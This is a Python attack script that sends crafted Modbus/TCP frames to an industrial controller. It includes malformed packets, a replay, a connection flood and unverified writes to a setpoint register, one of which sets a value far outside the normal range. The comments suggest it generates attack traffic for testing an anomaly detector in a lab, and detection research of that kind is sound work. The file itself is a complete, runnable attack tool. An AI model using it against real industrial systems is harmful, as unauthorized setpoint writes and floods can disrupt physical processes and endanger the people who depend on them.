"""
    python3 attacker.py --host 192.168.56.10 --port 5020 --attack illegal_func
    python3 attacker.py --host 192.168.56.10 --port 5020 --attack all
"""

import argparse
import socket
import struct
import time

PROTO_ID = 0
WRITE_ADDR = 1 


def build_message(trans_id, func_code, addr, qty_or_value, unit_id=1, bad_length=None):
    """Builds a raw Modbus/TCP request. For func 3/4 (read), the third
    arg is a quantity; for func 6 (write single register), it's the
    value to write. bad_length lets you lie about the length field on
    purpose, for the bad_length attack."""
    pdu = struct.pack(">BHH", func_code, addr, qty_or_value)
    body = struct.pack(">B", unit_id) + pdu
    real_length = len(body)
    length_field = bad_length if bad_length is not None else real_length
    header = struct.pack(">HHH", trans_id, PROTO_ID, length_field)
    return header + body


def send_raw(host, port, raw: bytes, label: str):
    with socket.create_connection((host, port), timeout=3) as s:
        s.sendall(raw)
        print(f"[{label}] sent {len(raw)} bytes: {raw.hex()}")
        try:
            resp = s.recv(256)
            print(f"[{label}] response: {resp.hex() if resp else '(no response / connection closed)'}")
        except socket.timeout:
            print(f"[{label}] no response (timed out) -- likely rejected silently")


def attack_illegal_func(host, port):
    #Sends 0x2B whichs is not a function code our normal traffic uses
    raw = build_message(trans_id=9001, func_code=0x2B, addr=10, qty_or_value=1)
    send_raw(host, port, raw, "illegal_func")


def attack_bad_length(host, port):
    #Claims the body is 99 bytes long when it's really around 6
    raw = build_message(trans_id=9002, func_code=3, addr=10, qty_or_value=1, bad_length=99)
    send_raw(host, port, raw, "bad_length")


def attack_out_of_range(host, port):
    #Quantity of 9999 registers is way beyond anything normal traffic reads
    raw = build_message(trans_id=9003, func_code=3, addr=10, qty_or_value=9999)
    send_raw(host, port, raw, "out_of_range")


def attack_replay(host, port):
    #Sends the exact same valid message twice in a row
    raw = build_message(trans_id=9004, func_code=3, addr=0, qty_or_value=2)
    send_raw(host, port, raw, "replay_1")
    time.sleep(0.2)
    send_raw(host, port, raw, "replay_2")


def attack_read_flood(host, port, n=50):
    for i in range(n):
        raw = build_message(trans_id=9100 + i, func_code=3, addr=0, qty_or_value=2)
        try:
            with socket.create_connection((host, port), timeout=1) as s:
                s.sendall(raw)
        except OSError as e:
            print(f"[read_flood] connection {i} failed: {e}")
    print(f"[read_flood] sent {n} valid-looking read requests back to back")


def attack_write_no_read(host, port):
    #A valid write to the setpoint register, with no earlier read of that address in this run.
    #Skips the read/verify step a real HMI always does first and is structurally and statistically normal.
    #Only the missing read-before-write gives it away.
    raw = build_message(trans_id=9200, func_code=6, addr=WRITE_ADDR, qty_or_value=500)
    send_raw(host, port, raw, "write_no_read")


def attack_value_jump(host, port):
    #Reads the write address first (so not a write_no_read), then writes a value far outside the normal step size.
    #Normal writes nudge the setpoint by roughly +/- 20.
    read_raw = build_message(trans_id=9201, func_code=3, addr=WRITE_ADDR, qty_or_value=1)
    send_raw(host, port, read_raw, "value_jump_precheck_read")
    time.sleep(0.3)
    write_raw = build_message(trans_id=9202, func_code=6, addr=WRITE_ADDR, qty_or_value=999)
    send_raw(host, port, write_raw, "value_jump")


ATTACKS = {
    "illegal_func": attack_illegal_func,
    "bad_length": attack_bad_length,
    "out_of_range": attack_out_of_range,
    "replay": attack_replay,
    "read_flood": attack_read_flood,
    "write_no_read": attack_write_no_read,
    "value_jump": attack_value_jump,
}


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=5020)
    parser.add_argument("--attack", choices=list(ATTACKS) + ["all"], default="all")
    args = parser.parse_args()

    to_run = ATTACKS if args.attack == "all" else {args.attack: ATTACKS[args.attack]}
    for name, fn in to_run.items():
        print(f"\n=== running: {name} ===")
        fn(args.host, args.port)
        time.sleep(1.0)


if __name__ == "__main__":
    main()